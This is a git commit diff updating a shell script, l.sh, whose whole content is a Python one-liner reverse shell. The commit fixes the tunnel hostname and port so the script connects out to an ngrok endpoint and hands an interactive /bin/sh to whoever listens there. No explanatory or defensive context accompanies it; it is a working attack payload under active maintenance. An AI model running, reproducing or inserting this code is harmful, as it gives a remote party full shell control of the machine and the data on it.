68d0b5a123b0c266aa6210f04dd64ad750f2c620
drdisexon <32791417+drdisexon@users.noreply.github.com>
2022-11-19 13:29:48 +0530

    Update l.sh

--- l.sh
+++ l.sh
@@ -1,2 +1,2 @@
 #!/bin/sh
-python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("0.tcp.in.ngok.io",11032));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
+python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("0.tcp.in.ngrok.io",15425));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
